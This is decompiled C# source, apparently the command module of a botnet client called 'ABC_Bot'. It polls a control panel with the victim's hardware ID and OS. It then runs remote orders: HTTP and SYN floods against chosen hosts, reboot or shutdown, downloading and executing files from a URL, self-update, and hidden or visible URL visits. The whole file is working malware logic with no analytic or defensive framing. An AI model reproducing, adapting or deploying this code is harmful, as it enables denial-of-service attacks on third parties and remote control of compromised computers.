using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

public class c_cmd
{
	[DebuggerNonUserCode]
	public c_cmd()
	{
	}

	public static object cmd()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		string text2 = default(string);
		string[] array = default(string[]);
		int num5 = default(int);
		int num6 = default(int);
		int num7 = default(int);
		Thread[] array2 = default(Thread[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 1087:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0044;
						case 4:
							goto IL_004e;
						case 5:
							goto IL_005f;
						case 6:
							goto IL_0072;
						case 7:
							goto IL_007f;
						case 8:
							goto IL_0088;
						case 9:
							goto IL_0093;
						case 10:
							goto IL_00a0;
						case 11:
							goto IL_00a8;
						case 12:
						case 13:
							goto IL_00ae;
						case 14:
							goto IL_00ba;
						case 15:
							goto IL_00c9;
						case 16:
							goto IL_00e3;
						case 17:
							goto IL_00f1;
						case 20:
							goto IL_0106;
						case 21:
							goto IL_011a;
						case 22:
							goto IL_0128;
						case 23:
							goto IL_0133;
						case 24:
							goto IL_013f;
						case 25:
							goto IL_0150;
						case 26:
							goto IL_0161;
						case 27:
							goto IL_0172;
						case 29:
							goto IL_017d;
						case 30:
							goto IL_0181;
						case 31:
							goto IL_018a;
						case 32:
							goto IL_0196;
						case 33:
							goto IL_01a7;
						case 34:
							goto IL_01b8;
						case 35:
							goto IL_01c9;
						case 39:
							goto IL_01d7;
						case 40:
							goto IL_01e8;
						case 41:
							goto IL_01f1;
						case 42:
							goto IL_01fb;
						case 44:
							goto IL_020e;
						case 45:
							goto IL_021f;
						case 47:
							goto IL_0236;
						case 48:
							goto IL_0247;
						case 50:
							goto IL_025e;
						case 51:
							goto IL_026f;
						case 53:
							goto IL_0281;
						case 54:
							goto IL_0292;
						case 56:
							goto IL_02a4;
						case 57:
							goto IL_02b5;
						case 58:
							goto IL_02be;
						case 59:
							goto IL_02d0;
						case 60:
						case 61:
							goto IL_02e2;
						case 62:
							goto IL_02f7;
						case 64:
							goto IL_0305;
						case 65:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 19:
						case 28:
						case 36:
						case 37:
						case 38:
						case 43:
						case 46:
						case 49:
						case 52:
						case 55:
						case 63:
						case 66:
						case 67:
						case 68:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0305:
					num = 64;
					break;
					IL_02f7:
					num = 62;
					Process.Start(text);
					goto end_IL_0000_3;
					IL_0009:
					num = 2;
					text2 = Conversions.ToString(mod_wrequest.request(main.panel, Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"action=cmd&hwid=", mod_hwid.hwid()), (object)"&os="), (object)mod_os.getOs()))));
					goto IL_0044;
					IL_0044:
					num = 3;
					text2 = text2.ToLower();
					goto IL_004e;
					IL_004e:
					num = 4;
					array = Strings.Split(text2, " -", -1, (CompareMethod)0);
					goto IL_005f;
					IL_005f:
					num = 5;
					if (text2.StartsWith("http"))
					{
						goto IL_0072;
					}
					goto IL_0106;
					IL_0072:
					num = 6;
					if (!main.http)
					{
						goto end_IL_0000_3;
					}
					goto IL_007f;
					IL_007f:
					num = 7;
					c_http.Flooding = true;
					goto IL_0088;
					IL_0088:
					num = 8;
					c_http.host = array[1];
					goto IL_0093;
					IL_0093:
					num = 9;
					num5 = Conversions.ToInteger(array[2]);
					goto IL_00a0;
					IL_00a0:
					num = 10;
					if (num5 < 1)
					{
						goto IL_00a8;
					}
					goto IL_00ae;
					IL_00a8:
					num = 11;
					num5 = 1;
					goto IL_00ae;
					IL_00ae:
					num = 13;
					num6 = num5;
					num7 = 1;
					goto IL_00fb;
					IL_00fb:
					if (num7 > num6)
					{
						goto end_IL_0000_3;
					}
					goto IL_00ba;
					IL_00ba:
					num = 14;
					array2 = new Thread[checked(num7 + 1)];
					goto IL_00c9;
					IL_00c9:
					num = 15;
					array2[num7] = new Thread((ThreadStart)delegate
					{
						c_http.http();
					});
					goto IL_00e3;
					IL_00e3:
					num = 16;
					array2[num7].Start();
					goto IL_00f1;
					IL_00f1:
					num = 17;
					num7 = checked(num7 + 1);
					goto IL_00fb;
					IL_0106:
					num = 20;
					if (text2.StartsWith("supersyn"))
					{
						goto IL_011a;
					}
					goto IL_01d7;
					IL_011a:
					num = 21;
					if (!main.supersyn)
					{
						goto end_IL_0000_3;
					}
					goto IL_0128;
					IL_0128:
					num = 22;
					if (!c_SuperSyn.IsEnabled)
					{
						goto IL_0133;
					}
					goto IL_017d;
					IL_0133:
					num = 23;
					c_SuperSyn.Host = array[1];
					goto IL_013f;
					IL_013f:
					num = 24;
					c_SuperSyn.Port = Conversions.ToInteger(array[2]);
					goto IL_0150;
					IL_0150:
					num = 25;
					c_SuperSyn.Threads = Conversions.ToInteger(array[3]);
					goto IL_0161;
					IL_0161:
					num = 26;
					c_SuperSyn.SuperSynSockets = Conversions.ToInteger(array[4]);
					goto IL_0172;
					IL_0172:
					num = 27;
					c_SuperSyn.StartSuperSyn();
					goto end_IL_0000_3;
					IL_017d:
					num = 29;
					goto IL_0181;
					IL_0181:
					num = 30;
					c_SuperSyn.StopSuperSyn();
					goto IL_018a;
					IL_018a:
					num = 31;
					c_SuperSyn.Host = array[1];
					goto IL_0196;
					IL_0196:
					num = 32;
					c_SuperSyn.Port = Conversions.ToInteger(array[2]);
					goto IL_01a7;
					IL_01a7:
					num = 33;
					c_SuperSyn.Threads = Conversions.ToInteger(array[3]);
					goto IL_01b8;
					IL_01b8:
					num = 34;
					c_SuperSyn.SuperSynSockets = Conversions.ToInteger(array[4]);
					goto IL_01c9;
					IL_01c9:
					num = 35;
					c_SuperSyn.StartSuperSyn();
					goto end_IL_0000_3;
					IL_01d7:
					num = 39;
					if (text2.StartsWith("stopflood"))
					{
						goto IL_01e8;
					}
					goto IL_020e;
					IL_01e8:
					num = 40;
					c_SuperSyn.StopSuperSyn();
					goto IL_01f1;
					IL_01f1:
					num = 41;
					c_http.Flooding = false;
					goto IL_01fb;
					IL_01fb:
					num = 42;
					c_http.host = "";
					goto end_IL_0000_3;
					IL_020e:
					num = 44;
					if (text2.StartsWith("reboot"))
					{
						goto IL_021f;
					}
					goto IL_0236;
					IL_021f:
					num = 45;
					Interaction.Shell("SHUTDOWN -r -t 01", (AppWinStyle)2, false, -1);
					goto end_IL_0000_3;
					IL_0236:
					num = 47;
					if (text2.StartsWith("shutdown"))
					{
						goto IL_0247;
					}
					goto IL_025e;
					IL_0247:
					num = 48;
					Interaction.Shell("SHUTDOWN -s -t 01", (AppWinStyle)2, false, -1);
					goto end_IL_0000_3;
					IL_025e:
					num = 50;
					if (text2.StartsWith("dlexec"))
					{
						goto IL_026f;
					}
					goto IL_0281;
					IL_026f:
					num = 51;
					c_dlexec.dlexec(array[1]);
					goto end_IL_0000_3;
					IL_0281:
					num = 53;
					if (text2.StartsWith("update"))
					{
						goto IL_0292;
					}
					goto IL_02a4;
					IL_0292:
					num = 54;
					c_dlexec.update(array[1]);
					goto end_IL_0000_3;
					IL_02a4:
					num = 56;
					if (!text2.StartsWith("visit"))
					{
						goto end_IL_0000_3;
					}
					goto IL_02b5;
					IL_02b5:
					num = 57;
					text = array[1];
					goto IL_02be;
					IL_02be:
					num = 58;
					if (!text.StartsWith("http://"))
					{
						goto IL_02d0;
					}
					goto IL_02e2;
					IL_02d0:
					num = 59;
					text = "http://" + text;
					goto IL_02e2;
					IL_02e2:
					num = 61;
					if (Operators.CompareString(array[2], "unhidden", false) == 0)
					{
						goto IL_02f7;
					}
					goto IL_0305;
					end_IL_0000_2:
					break;
				}
				num = 65;
				mod_wrequest.request(text, array[3]);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1087;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static object intvall()
	{
		int intervall = main.intervall;
		checked
		{
			for (int i = 1; i <= intervall; i++)
			{
				if (i == main.intervall - 1)
				{
					cmd();
					i = 1;
				}
				Thread.Sleep(1000);
			}
			object result = default(object);
			return result;
		}
	}
}
